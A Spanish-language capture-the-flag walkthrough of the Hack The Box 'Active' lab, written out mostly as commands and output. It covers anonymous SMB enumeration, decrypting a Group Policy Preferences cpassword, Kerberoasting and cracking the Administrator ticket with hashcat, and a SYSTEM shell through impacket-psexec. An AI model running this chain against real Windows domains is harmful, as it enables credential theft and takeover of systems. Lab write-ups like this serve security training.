Hack The Box - Active

# Hack The Box - Active 

*Active* es una máquina *Windows* de la plataforma *Hack The Box* con un *rating* de 5 estrellas creada por *eks* & *mrb3n*.

* * *

- Escaneo
	- nmap
- Enumeración
	- smbmap
	- smbclient
	- `Groups.xml` - gpp-decrypt
- Exploitación
	- Kerberoasting
	- psexec

Lo primero que haremos será añadir de la máquina y asignarle un "nombre" para que sea más fácil trabajar con ella, en este caso la he llamado active.htb.

```console
┌──(root💀kali)-[/home/kali]
└─# echo "10.10.10.100 active.htb" >> /etc/hosts

┌──(root💀kali)-[/home/kali]
└─# cat /etc/hosts | grep active                                                                          
10.10.10.100 active.htb
```

Lo siguiente que haremos será un escaneo en el *target* con `nmap`.

```console
┌──(root💀kali)-[/home/kali]
└─# nmap -sT -p- --open -T5 --min-rate 10000 -n active.htb
Starting Nmap 7.91 ( https://nmap.org ) at x x EDT
Warning: 10.10.10.100 giving up on port because retransmission cap hit (2).
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.063s latency).
Not shown: 36668 closed ports, 28851 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
49152/tcp open  unknown
49154/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49171/tcp open  unknown
49182/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.65 seconds
```

Tenemos el servicio samba expuesto (445), así que con la herramienta `smbclient` y `smbmap` procederemos a enumerar el servicio (obviamente desde una sesión nula o anónima, puesto que no tenemos todavía credenciales).

```console
┌──(root💀kali)-[/home/kali]
└─# smbmap -H active.htb                                                                                                      
[+] IP: active.htb:445  Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```

Observamos que tenemos un recurso compartido al cual solo tenemos acceso de lectura llamado `Replication`.

Nos conectaremos con un cliente de samba a ese recurso usando una sesión nula para poderlo enumerar más a fondo.

```console
┌──(root💀kali)-[/home/kali]
└─# smbclient -N \\\\active.htb\\Replication 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                10459647 blocks of size 4096. 5727505 blocks available
smb: \>
```

En nuestro proceso de enumeración nos damos cuenta de que este recurso replica a `SYSVOL`. Continuando la enumeración nos topamos con un directorio llamado `Policies`, el cual contiene las *Domain Group Policies*, al igual que si estuvieramos en el recurso `SYSVOL`.

```console
smb: \active.htb\> cd Policies
smb: \active.htb\Policies\> recurse
smb: \active.htb\Policies\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 06:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018
  Group Policy                        D        0  Sat Jul 21 06:37:44 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       22  Wed Jul 18 14:49:12 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPE.INI                             A      119  Wed Jul 18 16:46:06 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Microsoft                           D        0  Sat Jul 21 06:37:44 2018
  Preferences                         D        0  Sat Jul 21 06:37:44 2018
  Registry.pol                        A     2788  Wed Jul 18 14:53:45 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Wed Jul 18 14:49:12 2018
  ..                                  D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Microsoft                           D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Wed Jul 18 14:49:12 2018
  ..                                  D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Windows NT                          D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups                              D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Windows NT                          D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  SecEdit                             D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  SecEdit                             D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GptTmpl.inf                         A     1098  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GptTmpl.inf                         A     3722  Wed Jul 18 14:49:12 2018

                10459647 blocks of size 4096. 5727505 blocks available
```

En el directorio `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups` nos topamos con un archivo llamado `Groups.xml`, el cual contiene las credenciales de un usuario del dominio, podemos leer el archivo con `more` para que se nos abra una ventana del editor `vim`.

```console
smb: \active.htb\Policies\> more {31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as /tmp/smbmore.BZWfdL (2.3 KiloBytes/sec) (average 1.9 KiloBytes/sec)
```

```console
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9[...]" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
/tmp/smbmore.2qRr3M (END)
```

En los archivos `Group.xml`, se encuentran almacenadas las credenciales (Politicas de groupo para la administración de cuentas) de usuarios.

Como breve resumen, contiene una contraseña cifrada en `AES-256`. Sin embargo, Microsoft en 2012, publicó la clave AES, lo que significó, que se podían desencriptar.

Podemos desencriptar la contraseña usando (en Linux) la utilidad `gpp-decrypt`, y así obtenemos las credenciales para el usuario SVC_TGS.

```console
┌──(root💀kali)-[/home/kali]
└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA9[...]
GPP[...]
```

Con `crackmapexec` podemos comprobar que esas credenciales son válidas para nuestro *target*, pero no podemos ejecutar un movimiento lateral hacia la máquina o ejecutar código en ella puesto que no somos administradores (sino nos saldría un *pwned* en `crackmapexec`).

```console
┌──(root💀kali)-[/home/kali]
└─# crackmapexec smb active.htb -u 'SVC_TGS' -p 'GPP[...]'                                                       
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPP[...]
```

Teniendo el servicio Kerberos expuesto (88), y unas credenciales válidas del dominio, podemos intuir que el siguiente paso podría ser la técnica *Kerberoasting*.

Al igual que antes no voy a explicar el qué y cómo funciona Kerberos, pero dejaré por aquí recursos interesantes.

Com la *tool* de `impacket` `GetUserSPNs` podemos solicitar un TGS al DC son nuestras credenciales, y nos lo devolverá en un formato crackeable para `john` o `hashcat`

```console
┌──(root💀kali)-[/home/kali]
└─# impacket-GetUserSPNs -request active.htb/SVC_TGS -outputfile hash.txt                                                                                      130 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-07-22 11:21:54.046318             
                                                                                                                                                                     
┌──(root💀kali)-[/home/kali]
└─# cat hash.txt                                                                          
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f074093a03352e78c8b2e7222683e84c$8049798114e6f3ddd0a70d2c3a6b683f72b11ffe7037c3b2492cb9ec98434f285fa80f5df5cc32c68a52a0999fee25d262c64233414e3ecd2752677192e04c1800de3ac42f4b2df128b3ab93afbc1c3e42e84c932ae7d44c68caccb70fda914cbb86e58cdf0e9e25a916c135a5ab6dc6b2c1f68330b7d0dd323d7b141e28ac96a294a76299dbcef7be8c97fb24ef8e8bb364fbf006e9922c8b26822d0d5c4dc86f585432cdccd35acdda5d6a0a4584ed62d7cf34e00d4a7e0f190ac57f8419d1d3775580f132ac6704a199e98658de45dc2e38b035a47be10093d2f97be6fb7ede70bb93170b3c9977e686b2ade460c7e1e59e32ac18e6f763bb2219f51c0d5265fd5912ac4707b895c6a632fe5a7451a390f1218a969a6e491fcab3d668cc6bc2748663891dc9531eab48e5b9357b75ade3bb979306080be856f98e3cb24814a9c0bc8c88685c9f1b19f1a73499ee42a43510a653db16e3c7a91713db071cd386d0011b8c599110a6b4a928933fab7f8ca194687eb66c65aef12c3a41123f59976787ca494f1ce0e508e74e0d22397c36a4c318215cadd552d196e89813759677f5e84e690a9da936f2c1156be6438bc4702d5c832adcc4ceaac0748c679a661f296f6297420e3556ff95a72061fc789fed76b427c620c5091dd0d82752bb36025724b72495605827781e2ec07e998319cdc7d5f1e38e30e8b014a99a409423302381f1d8d06fbf1c6572f12b2edcddaf3e7c46a1c51720bbf10d2693efdfaa71c5fa6988a8c909a32994b0a2fc1519ade83bb2dae86783301409080bca791e41f79ee58192e57f9d2afcabd76ce56ddf2242b1c6079c3ce6931eae91274adb5bf047b9fde81d295820876612a82ca56977481422263bf536a9ec29c1a8ca2aba063ee2559285eca86984deeee7a86c8c49289dbb5192a764ae216bb1e48326e6787ac6fafe168707e45cc3a31dcc6774cb06100570f3fe8f46c8f504e64ae3d274407912917b0f7d75101600c87657f43ba26c01756902aa25ee1ec777ddcd1d7c7b74440dfe858c63ca7756f54262b12e5d688931a0e39049c9c46b919070775a2db175dd107ae19dcbf32c2f5315dace8693e895d36f0fa0aae28f18ab3f94de7b3f0c94fd4f7e6aea61909c1eded7a94b8ecd9bc8d135f9fc5f389956030ed64edfb7b021ed1fa94d58da2576cf9f23f0c7585405c6f4cfdbde78a11ef13ca43bfa924b5bad6babed5073d6c769d445efdae60969ab5cad
```

Con `hashcat` en el modo 13100, podemos crackear los TGS de Kerberos.

```console
┌──(root💀kali)-[/home/kali]
└─# hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: x

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 134 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ec17108f0d44dd2ae92650f33e6ec1ef$e05e1d69bc38a13e45b607251effe7c10c3f5eb0556aed7e41649dc6bab22e38ad7aa46676f4caf2a19fbcb486ccec978cf0c3527b79d79b51482f47adf1bb2d1ef898634227f04316023dcc942cae7ec8a82d252ce098486231d1974c647e693d514ebba848483b66f232240361267a5e6f5978a92af55c98811f20569729fd92efca92f540587e24982c2a2de82bec41e8bd2bb7e2b8e2ae5d2ddb8a3c1c4e6a8d8b974ed4d8ccec139c9a6154e839605c5805d43241d505b3f8598b37de7361b843528888bfa0cd5840da10b2a5f40506f8e3cc8bc05f7ff310b9a48902e1ef99cd33e120fb16dc9c6c343a2a1a963a1ad73de6a4e7a4bb71d8fd66282e67d51e4a5a76ad1b3bbd03c7067bf6b154a1e4accfc0c3cf7350d32f58415587d30e832e2a270480ece0a641bee56d0728d3ae54d6b07ce291b1eec9bc6d3607c131868bd9151bc96fe5505d7da71beb2dd1c0b5a3349f12b9c5b430230ee87fe25542f7d3d6b66adab87154c2884d2879c7ea49b8312a3c46609df117f98ef9d57ffb3ad37db5036644f8c84868144ed1b120412ef06a0c2a44fb58c3674eb438dbae0f165b241db999016d39dab05fb3274b49e9fa86e538e40f56ee75078d7c4505ce96b1a2880f63ce8c3a013388b717d5e160dcfa861a2ac26a9e6096038cb62f2e3d4d9c35841dad8b3d98aa462e061acb6df8c49c883a6809374713ebf98d054d11183fe844051180b67d5682d9201b04e0ad4ad1c969b3ca8ccd538555329eb8a2c8b96095c40bc0331d0ec54651f8cea1903ad23c32cfac741e9c6012a3d6a34766cdd768c2b674ad3f3693f75584846347d0262c8809e6f2c51978fbe728481c375b4ef14b503517cc930b0e10cac3545f60564394487065f16078c5da6948973417ba8be6331a028ded71b07a839cd9a526219e431493e838ecfaf6daf588872f3f86d5429f52812d478d18febc7010848cf000d31a5efe5862ef3b50dd82c91368e2ff45693c838a57f1a3bc3b9a1c24a7b2f1a93e214cbe173766f8e18c2ac2d5f461ab2325df9a9a89cd700daed284651f3b07a0b9a450dee57f01cbe628c138fc1f1e3d3c553c7e5fe932a12f34e70580fb77b60e50e0d33b10f8ea9771d6e0e6ac9c36c4c5ac655a01297da5ab94b3673cd42f2c1756b377c3a992a8b38ae3e993aef72d1c60c4cc5a0c7d3f04f3dfb58371b7d67744fb4d4cd91a7184391997a8a1c8ecaa1b291da2c1f8458d56d787954758:Ticket[...]
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...954758
Time.Started.....: Thu Jul 22 11:25:11 2021 (11 secs)
Time.Estimated...: Thu Jul 22 11:25:22 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   933.4 kH/s (9.93ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10551296/14344385 (73.56%)
Rejected.........: 0/10551296 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tioncurtis23 -> TUGGIE

Started: x
Stopped: x
```

Una vez tenemos las credenciales podemos comprobarlas con `crackmapexec`, y al poner `Pwn3d!` ya podemos movernos lateralmente (`psexsec`) o ejecutar código en el DC como el usuario actual.

```console
┌──(root💀kali)-[/home/kali]
└─# crackmapexec smb active.htb -u 'Administrator' -p 'Ticket[...]'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticket[...] (Pwn3d!)

┌──(root💀kali)-[/home/kali]
└─# crackmapexec smb active.htb -u 'Administrator' -p 'Ticket[...]' -x whoami    
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticket[...] (Pwn3d!)
SMB         10.10.10.100    445    DC               [+] Executed command 
SMB         10.10.10.100    445    DC               active\administrator
```

Finalmente, con `psexsec` nos generamos una shell inversa.

```console
┌──(root💀kali)-[/home/kali]
└─# impacket-psexec active.htb/Administrator:Ticket[...]@10.10.10.100                                                                                     130 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file KtWiNOMK.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service sWtv on 10.10.10.100.....
[*] Starting service sWtv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
DC

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
<no_te_la_voy_a_decir>

C:\Windows\system32>
```